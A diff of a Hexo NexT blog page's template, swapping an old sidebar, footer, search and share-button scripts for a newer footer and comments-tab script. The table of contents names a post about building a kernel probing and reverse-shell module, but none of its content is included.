-          </li>
-        </ul>
-      
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image"
-                src="/avatar/avatar.jpeg"
-                alt="sunichi"/>
-            
-              <p class="site-author-name" itemprop="name">sunichi</p>
-              <div class="site-description motion-element" itemprop="description"></div>
-          </div>
-
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
-                
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">46</span>
-                    <span class="site-state-item-name">日志</span>
-                  </a>
-                </div>
-              
-
-              
-
-              
-                
-                
-                <div class="site-state-item site-state-tags">
-                  
-                    
-                      <a href="/tags/">
-                    
-                  
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">54</span>
-                    <span class="site-state-item-name">标签</span>
-                  </a>
-                </div>
-              
-            </nav>
-          
-
-          
-
-          
-            <div class="links-of-author motion-element">
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://github.com/sunichi" title="GitHub &rarr; https://github.com/sunichi" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
-                </span>
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://twitter.com/sunichi17" title="Twitter &rarr; https://twitter.com/sunichi17" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
-                </span>
-              
-            </div>
-          
-
-          
-
-          
-          
-            <div class="links-of-blogroll motion-element links-of-blogroll-block">
-              <div class="links-of-blogroll-title">
-                <i class="fa  fa-fw fa-link"></i>
-                Links
-              </div>
-              <ul class="links-of-blogroll-list">
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://p4nda.top" title="http://p4nda.top" rel="noopener" target="_blank">P4nda</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://blog.aisissel.cn/" title="https://blog.aisissel.cn/" rel="noopener" target="_blank">Sissel</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://thinkycx.me/" title="https://thinkycx.me/" rel="noopener" target="_blank">thinkycx</a>
-                  </li>
-                
-              </ul>
-            </div>
-          
-
-          
-            
-          
-          
-
-        </div>
-      </div>
-
-      
-      <!--noindex-->
-        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-            
-            
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-知己知彼"><span class="nav-number">1.</span> <span class="nav-text">0x00 知己知彼</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-第一阶段"><span class="nav-number">2.</span> <span class="nav-text">0x01 第一阶段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-第二阶段-创建探针内核模块"><span class="nav-number">3.</span> <span class="nav-text">0x02 第二阶段 - 创建探针内核模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#函数CRC"><span class="nav-number">3.1.</span> <span class="nav-text">函数CRC</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#基础概念"><span class="nav-number">3.1.1.</span> <span class="nav-text">基础概念</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#内核导出符号CRC生成规则"><span class="nav-number">3.1.2.</span> <span class="nav-text">内核导出符号CRC生成规则</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-1-Find-the-call-usermodehelper-CRC-Address-on-the-Target-Kernel"><span class="nav-number">3.2.</span> <span class="nav-text">Step 1 - Find the call_usermodehelper CRC Address on the Target Kernel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-2-Prepare-a-Makefile"><span class="nav-number">3.3.</span> <span class="nav-text">Step 2 - Prepare a Makefile</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-3-Edit-Fields-to-Match-the-Target-Kernel"><span class="nav-number">3.4.</span> <span class="nav-text">Step 3 - Edit Fields to Match the Target Kernel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-4-Change-init-module-Offset"><span class="nav-number">3.5.</span> <span class="nav-text">Step 4 - Change init_module Offset</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-5-Load-the-‘Probing’-Module-to-the-Target-Kernel"><span class="nav-number">3.6.</span> <span class="nav-text">Step 5 - Load the ‘Probing’ Module to the Target Kernel</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-第三阶段-创建反向shell模块"><span class="nav-number">4.</span> <span class="nav-text">0x03 第三阶段 - 创建反向shell模块</span></a></li></ol></div>
-            
-
-          </div>
-        </div>
-      <!--/noindex-->
-      
-
-      
-
-    </div>
-  </aside>
-  
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">sunichi</span>
-
-  
-
-  
-</div>
-
-
-  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.4.4</div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.0.1</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
-    
-
-    
-  </div>
-
-  
 
 <script>
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
   }
 </script>
 
+    </div>
+  </main>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  <script src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-
-  
-
-
-  <script src="/js/src/utils.js?v=7.0.1"></script>
-
-  <script src="/js/src/motion.js?v=7.0.1"></script>
-
-
-
-  
-  
-
-
-  <script src="/js/src/schemes/muse.js?v=7.0.1"></script>
-
-
-
-  
-  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
-<script src="/js/src/post-details.js?v=7.0.1"></script>
-
-
-
-  
-
-
-  <script src="/js/src/next-boot.js?v=7.0.1"></script>
-
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-
-  
-  <script>
-    // Popup Window;
-    var isfetched = false;
-    var isXml = true;
-    // Search DB path;
-    var search_path = "search.xml";
-    if (search_path.length === 0) {
-      search_path = "search.xml";
-    } else if (/json$/i.test(search_path)) {
-      isXml = false;
-    }
-    var path = "/" + search_path;
-    // monitor main search box;
-
-    var onPopupClose = function (e) {
-      $('.popup').hide();
-      $('#local-search-input').val('');
-      $('.search-result-list').remove();
-      $('#no-result').remove();
-      $(".local-search-pop-overlay").remove();
-      $('body').css('overflow', '');
-    }
-
-    function proceedsearch() {
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
-        .css('overflow', 'hidden');
-      $('.search-popup-overlay').click(onPopupClose);
-      $('.popup').toggle();
-      var $localSearchInput = $('#local-search-input');
-      $localSearchInput.attr("autocapitalize", "none");
-      $localSearchInput.attr("autocorrect", "off");
-      $localSearchInput.focus();
-    }
-
-    // search function;
-    var searchFunc = function(path, search_id, content_id) {
-      'use strict';
-
-      // start loading animation
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
-          '<div id="search-loading-icon">' +
-          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
-          '</div>' +
-          '</div>')
-        .css('overflow', 'hidden');
-      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+  <footer class="footer">
+    <div class="footer-inner">
+      
 
       
 
-      $.ajax({
-        url: path,
-        dataType: isXml ? "xml" : "json",
-        async: true,
-        success: function(res) {
-          // get the contents from search data
-          isfetched = true;
-          $('.popup').detach().appendTo('.header-inner');
-          var datas = isXml ? $("entry", res).map(function() {
-            return {
-              title: $("title", this).text(),
-              content: $("content",this).text(),
-              url: $("url" , this).text()
-            };
-          }).get() : res;
-          var input = document.getElementById(search_id);
-          var resultContent = document.getElementById(content_id);
-          var inputEventFunction = function() {
-            var searchText = input.value.trim().toLowerCase();
-            var keywords = searchText.split(/[\s\-]+/);
-            if (keywords.length > 1) {
-              keywords.push(searchText);
-            }
-            var resultItems = [];
-            if (searchText.length > 0) {
-              // perform local searching
-              datas.forEach(function(data) {
-                var isMatch = false;
-                var hitCount = 0;
-                var searchTextCount = 0;
-                var title = data.title.trim();
-                var titleInLowerCase = title.toLowerCase();
-                var content = data.content.trim().replace(/<[^>]+>/g,"");
-                
-                var contentInLowerCase = content.toLowerCase();
-                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
-                var indexOfTitle = [];
-                var indexOfContent = [];
-                // only match articles with not empty titles
-                if(title != '') {
-                  keywords.forEach(function(keyword) {
-                    function getIndexByWord(word, text, caseSensitive) {
-                      var wordLen = word.length;
-                      if (wordLen === 0) {
-                        return [];
-                      }
-                      var startPosition = 0, position = [], index = [];
-                      if (!caseSensitive) {
-                        text = text.toLowerCase();
-                        word = word.toLowerCase();
-                      }
-                      while ((position = text.indexOf(word, startPosition)) > -1) {
-                        index.push({position: position, word: word});
-                        startPosition = position + wordLen;
-                      }
-                      return index;
-                    }
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">sunichi</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
 
-                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
-                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
-                  });
-                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
-                    isMatch = true;
-                    hitCount = indexOfTitle.length + indexOfContent.length;
-                  }
-                }
+    </div>
+  </footer>
 
-                // show search results
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
-                if (isMatch) {
-                  // sort index by position of keyword
+  
 
-                  [indexOfTitle, indexOfContent].forEach(function (index) {
-                    index.sort(function (itemLeft, itemRight) {
-                      if (itemRight.position !== itemLeft.position) {
-                        return itemRight.position - itemLeft.position;
-                      } else {
-                        return itemLeft.word.length - itemRight.word.length;
-                      }
-                    });
-                  });
 
-                  // merge hits into slices
 
-                  function mergeIntoSlice(text, start, end, index) {
-                    var item = index[index.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    var hits = [];
-                    var searchTextCountInSlice = 0;
-                    while (position + word.length <= end && index.length != 0) {
-                      if (word === searchText) {
-                        searchTextCountInSlice++;
-                      }
-                      hits.push({position: position, length: word.length});
-                      var wordEnd = position + word.length;
 
-                      // move to next position of hit
 
-                      index.pop();
-                      while (index.length != 0) {
-                        item = index[index.length - 1];
-                        position = item.position;
-                        word = item.word;
-                        if (wordEnd > position) {
-                          index.pop();
-                        } else {
-                          break;
-                        }
-                      }
-                    }
-                    searchTextCount += searchTextCountInSlice;
-                    return {
-                      hits: hits,
-                      start: start,
-                      end: end,
-                      searchTextCount: searchTextCountInSlice
-                    };
-                  }
 
-                  var slicesOfTitle = [];
-                  if (indexOfTitle.length != 0) {
-                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
-                  }
 
-                  var slicesOfContent = [];
-                  while (indexOfContent.length != 0) {
-                    var item = indexOfContent[indexOfContent.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    // cut out 100 characters
-                    var start = position - 20;
-                    var end = position + 80;
-                    if(start < 0){
-                      start = 0;
-                    }
-                    if (end < position + word.length) {
-                      end = position + word.length;
-                    }
-                    if(end > content.length){
-                      end = content.length;
-                    }
-                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
-                  }
 
-                  // sort slices in content by search text's count and hits' count
 
-                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
-                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
-                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
-                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
-                      return sliceRight.hits.length - sliceLeft.hits.length;
-                    } else {
-                      return sliceLeft.start - sliceRight.start;
-                    }
-                  });
 
-                  // select top N slices in content
 
-                  var upperBound = parseInt('1');
-                  if (upperBound >= 0) {
-                    slicesOfContent = slicesOfContent.slice(0, upperBound);
-                  }
 
-                  // highlight title and content
 
-                  function highlightKeyword(text, slice) {
-                    var result = '';
-                    var prevEnd = slice.start;
-                    slice.hits.forEach(function (hit) {
-                      result += text.substring(prevEnd, hit.position);
-                      var end = hit.position + hit.length;
-                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
-                      prevEnd = end;
-                    });
-                    result += text.substring(prevEnd, slice.end);
-                    return result;
-                  }
-
-                  var resultItem = '';
-
-                  if (slicesOfTitle.length != 0) {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
-                  } else {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
-                  }
-
-                  slicesOfContent.forEach(function (slice) {
-                    resultItem += "<a href='" + articleUrl + "'>" +
-                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
-                      "...</p>" + "</a>";
-                  });
-
-                  resultItem += "</li>";
-                  resultItems.push({
-                    item: resultItem,
-                    searchTextCount: searchTextCount,
-                    hitCount: hitCount,
-                    id: resultItems.length
-                  });
-                }
-              })
-            };
-            if (keywords.length === 1 && keywords[0] === "") {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
-            } else if (resultItems.length === 0) {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
-            } else {
-              resultItems.sort(function (resultLeft, resultRight) {
-                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
-                  return resultRight.searchTextCount - resultLeft.searchTextCount;
-                } else if (resultLeft.hitCount !== resultRight.hitCount) {
-                  return resultRight.hitCount - resultLeft.hitCount;
-                } else {
-                  return resultRight.id - resultLeft.id;
-                }
-              });
-              var searchResultList = '<ul class=\"search-result-list\">';
-              resultItems.forEach(function (result) {
-                searchResultList += result.item;
-              })
-              searchResultList += "</ul>";
-              resultContent.innerHTML = searchResultList;
-            }
-          }
-
-          if ('auto' === 'auto') {
-            input.addEventListener('input', inputEventFunction);
-          } else {
-            $('.search-icon').click(inputEventFunction);
-            input.addEventListener('keypress', function (event) {
-              if (event.keyCode === 13) {
-                inputEventFunction();
-              }
-            });
-          }
-
-          // remove loading animation
-          $(".local-search-pop-overlay").remove();
-          $('body').css('overflow', '');
-
-          proceedsearch();
-        }
-      });
-    }
-
-    // handle and trigger popup window;
-    $('.popup-trigger').click(function(e) {
-      e.stopPropagation();
-      if (isfetched === false) {
-        searchFunc(path, 'local-search-input', 'local-search-result');
-      } else {
-        proceedsearch();
-      };
-    });
-
-    $('.popup-btn-close').click(onPopupClose);
-    $('.popup').click(function(e){
-      e.stopPropagation();
-    });
-    $(document).on('keyup', function (event) {
-      var shouldDismissSearchPopup = event.which === 27 &&
-        $('.search-popup').is(':visible');
-      if (shouldDismissSearchPopup) {
-        onPopupClose();
-      }
-    });
-  </script>
 
 
 
@@ -1455,43 +552,12 @@ int b;
 
   
 
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-  
-  
-  <script src="/lib/needsharebutton/needsharebutton.js"></script>
-  <script>
-    
-      pbOptions = {};
-      
-        pbOptions.iconStyle = "default";
-      
-        pbOptions.boxForm = "horizontal";
-      
-        pbOptions.position = "bottomCenter";
-      
-        pbOptions.networks = "Weibo,Wechat,Twitter,Facebook,Evernote";
-      
-      new needShareButton('#needsharebutton-postbottom', pbOptions);
-    
-    
-  </script>
 
 
-  
 
-  
+
+
+
 
   
 
